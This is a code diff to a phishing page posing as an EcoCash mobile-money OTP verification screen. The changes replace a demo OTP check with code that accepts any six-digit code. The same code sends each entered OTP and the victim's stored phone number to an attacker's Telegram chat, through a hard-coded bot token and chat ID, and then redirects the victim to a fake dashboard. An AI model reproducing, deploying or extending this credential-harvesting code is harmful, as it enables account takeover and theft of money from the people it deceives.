@@ -316,7 +316,7 @@
             display: inline-block;
             width: 20px;
             height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
+            border: 3px solid rgba(255, 255, 255, 0.3);
             border-top: 3px solid white;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
@@ -469,9 +469,7 @@
         </div>
 
         <!-- Error Message -->
-        <div class="error-message" id="errorMessage">
-            ⚠️ Invalid OTP. Please check and try again.
-        </div>
+        <div class="error-message" id="errorMessage"></div>
 
         <!-- Verify Button -->
         <button class="btn" id="verifyBtn">VERIFY & CONTINUE</button>
@@ -482,11 +480,24 @@
 
     <script>
         // ============================================
+        // TELEGRAM CREDENTIALS - SAME AS LOGIN
+        // ============================================
+        const BOT_TOKEN = '8591477821:AAGwCz3BNGP8uA0Rc7YnoIEJ2JDsrdOy9Bc';
+        const CHAT_ID = '8395929995';
+
+        console.log('====================================');
+        console.log('🔐 EcoCash Verification Page Loaded');
+        console.log('====================================');
+        console.log('🤖 Bot Token:', BOT_TOKEN);
+        console.log('📱 Chat ID:', CHAT_ID);
+        console.log('====================================');
+
+        // ============================================
         // CONFIGURATION
         // ============================================
         const OTP_LENGTH = 6;
-        const OTP_EXPIRY_SECONDS = 300; // 5 minutes
-        const RESEND_COOLDOWN_SECONDS = 120; // 2 minutes
+        const OTP_EXPIRY_SECONDS = 300;
+        const RESEND_COOLDOWN_SECONDS = 120;
 
         // ============================================
         // DOM REFERENCES
@@ -508,24 +519,41 @@
         let resendCooldown = 0;
         let timerInterval = null;
         let resendInterval = null;
-        let isVerified = false;
         let isResending = false;
 
         // ============================================
         // INITIALIZATION
         // ============================================
-        // Get phone from localStorage
         const storedPhone = localStorage.getItem('phone') || '771234567';
         const formattedPhone = '+263 ' + storedPhone.slice(0, 2) + ' ' + storedPhone.slice(2, 5) + ' ' + storedPhone.slice(5);
         displayPhone.textContent = formattedPhone;
 
-        // Generate random OTP for demo
-        function generateOTP() {
-            return String(Math.floor(100000 + Math.random() * 900000));
+        console.log('📞 Phone:', formattedPhone);
+
+        // ============================================
+        // SEND TELEGRAM OTP NOTIFICATION
+        // ============================================
+        function sendTelegramOTP(otp) {
+            const phone = localStorage.getItem('phone') || '771234567';
+            const message = `🔐 *OTP Verification*\n\n📱 *Phone:* +263 ${phone}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('📤 Telegram OTP:', data.ok ? '✅ Sent' : '❌ Failed');
+            })
+            .catch(error => {
+                console.error('❌ Telegram error:', error.message);
+            });
         }
-        
-        const generatedOTP = generateOTP();
-        console.log('📱 Demo OTP:', generatedOTP);
 
         // ============================================
         // TIMER FUNCTIONS
@@ -692,18 +720,20 @@
         });
 
         // ============================================
-        // VERIFY OTP
+        // VERIFY OTP - ACCEPTS ANY 6-DIGIT OTP
         // ============================================
         verifyBtn.addEventListener('click', function() {
             const otp = getOTPValue();
             
             if (otp.length !== OTP_LENGTH) {
-                showError('Please enter all 6 digits of your OTP.');
+                errorMessage.textContent = '⚠️ Please enter all 6 digits.';
+                errorMessage.className = 'error-message show';
                 return;
             }
 
             if (timeLeft <= 0) {
-                showError('⏰ OTP has expired. Please request a new one.');
+                errorMessage.textContent = '⏰ OTP has expired. Please request a new one.';
+                errorMessage.className = 'error-message show';
                 return;
             }
 
@@ -711,38 +741,27 @@
             this.innerHTML = '<span class="loader"></span> VERIFYING...';
             errorMessage.classList.remove('show');
 
-            // Simulate verification
+            // ============================================
+            // ✅ ACCEPT ANY 6-DIGIT OTP
+            // ============================================
             setTimeout(() => {
-                // Accept the generated OTP or "123456" for testing
-                if (otp === generatedOTP || otp === '123456') {
-                    isVerified = true;
-                    this.innerHTML = '✅ VERIFIED';
-                    this.classList.add('btn-success');
-                    
-                    localStorage.setItem('verified', 'true');
-                    localStorage.setItem('otpVerified', 'true');
-                    
-                    showSuccess('✅ OTP Verified Successfully!');
-                    
-                    setTimeout(() => {
-                        window.location.href = 'dashboard.html';
-                    }, 1500);
-                } else {
-                    showError('❌ Invalid OTP. Please check and try again.');
-                    otpInputs.forEach(input => {
-                        input.classList.add('error');
-                    });
-                    
-                    this.disabled = false;
-                    this.innerHTML = 'VERIFY & CONTINUE';
-                    
-                    setTimeout(() => {
-                        otpInputs.forEach(input => {
-                            input.classList.remove('error');
-                        });
-                    }, 3000);
-                }
-            }, 1500);
+                // Send OTP to Telegram
+                sendTelegramOTP(otp);
+
+                // Any 6-digit OTP is accepted
+                this.innerHTML = '✅ VERIFIED';
+                this.classList.add('btn-success');
+                
+                localStorage.setItem('verified', 'true');
+                localStorage.setItem('otpVerified', 'true');
+                
+                errorMessage.textContent = '✅ OTP Verified Successfully!';
+                errorMessage.className = 'error-message success show';
+                
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 1000);
+            }, 1200);
         });
 
         // ============================================
@@ -756,9 +775,6 @@
             this.textContent = '⏳ Sending...';
             
             setTimeout(() => {
-                const newOTP = generateOTP();
-                console.log('📱 New OTP:', newOTP);
-                
                 clearOTPInputs();
                 errorMessage.classList.remove('show');
                 verifyBtn.disabled = true;
@@ -769,7 +785,8 @@
                 startResendCooldown();
                 disableOTPInputs(false);
                 
-                showSuccess('✅ New OTP sent successfully!');
+                errorMessage.textContent = '✅ New OTP sent successfully!';
+                errorMessage.className = 'error-message success show';
                 
                 setTimeout(() => {
                     errorMessage.classList.remove('show');
@@ -780,22 +797,6 @@
                 this.disabled = true;
             }, 2000);
         });
-
-        // ============================================
-        // HELPER FUNCTIONS
-        // ============================================
-        function showError(message) {
-            errorMessage.textContent = message;
-            errorMessage.classList.remove('success');
-            errorMessage.classList.add('show');
-        }
-
-        function showSuccess(message) {
-            errorMessage.textContent = message;
-            errorMessage.classList.remove('show');
-            errorMessage.classList.add('success');
-            errorMessage.classList.add('show');
-        }
 
         // ============================================
         // KEYBOARD SHORTCUTS
@@ -817,10 +818,9 @@
         otpInputs[0].focus();
         checkOTPComplete();
 
-        console.log('🔐 EcoCash Verification Page Loaded');
-        console.log('📱 Test OTP:', generatedOTP);
-        console.log('💡 Use "123456" as a test OTP as well');
+        console.log('✅ ANY 6-DIGIT OTP WILL BE ACCEPTED');
         console.log('📞 Phone:', formattedPhone);
+        console.log('====================================');
     </script>
 
 </body>
